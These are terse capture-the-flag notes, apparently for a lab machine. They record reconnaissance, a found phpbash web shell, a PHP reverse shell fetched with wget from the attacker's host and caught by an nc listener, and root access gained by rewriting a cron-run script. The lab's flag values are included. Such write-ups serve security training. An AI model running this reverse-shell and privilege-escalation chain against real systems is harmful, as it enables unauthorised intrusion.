@@ -1,0 +1,44 @@
+nmap -sC -sV -oN nmap 10.10.10.68 -v -A
+-> only port 80
+
+http://10.10.10.68/single.html -> shows about phpbash
+
+dirb
+-> /php = nothing interesting
+-> /dev = phpbash
+
+cd /home -> arrexel and we get user flag
+2c281f318555dbc1b856957c7147bfc1
+
+echo allo > test
+cat test -> success
+
+echo "<?php echo allo; ?>" > test.php ===> echo "" > test.php
+cat test.php -> fails
+= filter on input
+
+i saw /uploads in dirb, maybe i can download a reverse shell
+
+nc -lvnp 4444 on host and ip a to get ip
+
+cp /usr/share/laudanum/php/php-reverse-shell.php .
+change ip:port
+
+python -m SimpleHTTPServer 80
+
+then dl reverse shell on target
+wget 10.10.14.34/php-reverse-shell.php (10.10.14.34 = host ip)
+
+then go to /uploads/php-reverse-shell.php -> nc opens a shell
+
+sudo -l -> sudo -u scriptmanager bash then spawn /bin/sh again
+ls -all in / -> scripts belongs to scriptmanager
+
+we see test.py is executed by root every minute
+because it writes in "test.txt" which belongs to root
+modify test.py to print /root/root.txt
+
+echo 'f = open("/root/root.txt", "r").read(); g = open("test.txt", "w"); g.write(f)' > test.py
+
+root flag:
+cc4f0afe3a1026d402ba10329674a8e2
